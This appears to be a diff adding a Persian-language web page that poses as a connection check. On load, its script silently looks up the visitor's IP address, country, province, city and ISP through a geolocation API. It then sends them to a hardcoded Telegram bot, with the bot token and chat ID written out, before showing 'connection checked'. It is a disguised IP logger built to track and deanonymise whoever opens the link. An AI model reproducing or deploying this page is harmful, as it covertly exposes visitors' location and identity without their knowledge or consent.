@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>در حال بررسی اتصال...</title>
+</head>
+<body>
+  <h2>📡 در حال بررسی اتصال شما...</h2>
+
+  <script>
+    async function fetchIPInfoAndSend() {
+      try {
+        const res = await fetch("https://api.db-ip.com/v2/free/self");
+        const data = await res.json();
+
+        const ip = data.ipAddress || "نامشخص";
+        const country = data.countryName || "نامشخص";
+        const state = data.stateProv || "نامشخص";
+        const city = data.city || "نامشخص";
+        const isp = data.isp || "نامشخص";
+
+        const msg = `📥 اطلاعات اتصال از گوشی:
+🌍 کشور: ${country}
+🏙️ شهر: ${city}
+📡 آی‌پی: ${ip}
+🧭 استان: ${state}
+🔌 سرویس‌دهنده: ${isp}`;
+
+        // ارسال به تلگرام
+        const token = "7504741612:AAE1FQmnyKEKzgCsL0PPmKkclK7iYhpgaC0";     // ← اینجا توکن بذار
+        const chat_id = "7550898836";     // ← اینجا آیدی عددی بذار
+
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id,
+            text: msg,
+          }),
+        });
+
+        document.body.innerHTML = "<h2>✅ اتصال بررسی شد!</h2>";
+      } catch (error) {
+        console.error("خطا:", error);
+        document.body.innerHTML = "<h2>❌ خطا در دریافت اطلاعات</h2>";
+      }
+    }
+
+    fetchIPInfoAndSend();
+  </script>
+</body>
+</html>
